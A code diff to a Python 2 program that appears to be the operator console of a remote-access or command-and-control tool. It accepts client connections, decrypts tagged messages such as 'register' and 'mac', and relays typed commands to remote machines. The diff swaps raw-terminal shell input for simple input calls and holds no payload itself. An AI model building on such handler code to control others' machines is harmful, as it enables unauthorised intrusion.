@@ -119,35 +119,7 @@ class Server(threading.Thread):
                 p.append(i)
         return unhexlify(str().join(block[n] for n in p))
 
-    def server_shell(self):
-        fd = sys.stdin.fileno()
-        old_settings = termios.tcgetattr(fd)
-        cmd_buffer   = ''
-        while True:
-            with self.cond:
-                while self.current_client:
-                    self.cond.wait()
-            while '\r' not in cmd_buffer:
-                tty.setraw(fd)
-                ch = sys.stdin.read(1)
-                if ch.startswith('\x08'):
-                    cmd_buffer = cmd_buffer[:-1]
-                else:
-                    cmd_buffer += ch
-                    termios.tcsetattr(fd, termios.TCSANOW, old_settings)
-                    print prompt,ch,
-                    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
-                    cmd_buffer = cmd_buffer.rstrip().strip()
-                    if cmd_buffer in self.commands:
-                        try:
-                            self.commands[cmd_buffer]()
-                        except Exception as xe:
-                            print 'Server shell error: {}'.format(str(xe))
-
     def run(self):
-        t = threading.Thread(target=self.server_shell)
-        t.daemon = True
-        t.start()
         while True:
             conn, addr = self.s.accept()
             client_id = self.client_count
@@ -307,26 +279,6 @@ class Client(threading.Thread):
             except:
                 return'Query returned no output'
 
-    def client_shell(self, prompt):
-        try:
-            fd = sys.stdin.fileno()
-            old_settings = termios.tcgetattr(fd)
-            with self.cond:
-                while not self.current():
-                    self.cond.wait()
-            cmd_buffer   = ''       
-            while '\r' not in cmd_buffer:
-                os.system('clear')
-                tty.setraw(fd)
-                ch = sys.stdin.read(1)
-                cmd_buffer += ch
-                termios.tcsetattr(fd, termios.TCSANOW, old_settings)
-                print prompt.format(self.uid), ch,
-            cmd_buffer = cmd_buffer.rstrip().strip()
-            return cmd_buffer
-        finally:
-            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings) 
-
     def run(self):
         global server
         while True:
@@ -336,8 +288,9 @@ class Client(threading.Thread):
                 method, _, data = cmd_buffer.partition(':')
                 client_data = self.decrypt(data)
             if 'prompt' in method:
-                prompt = client_data.format(self.uid)
-                client_buffer = client.shell(prompt)
+                client_buffer = client_data.format(self.uid)
+                print client_buffer,
+                client_buffer += raw_input('')
                 client_buffer += "\n"
                 self.sender(client_buffer)
             else:
@@ -345,8 +298,7 @@ class Client(threading.Thread):
                     self.registered = self.register(client_data)
                 elif 'mac' in method:
                     self.mac = client_data
-                else:
-                    print client_data
+                print client_data
 
 
 def get_parser():
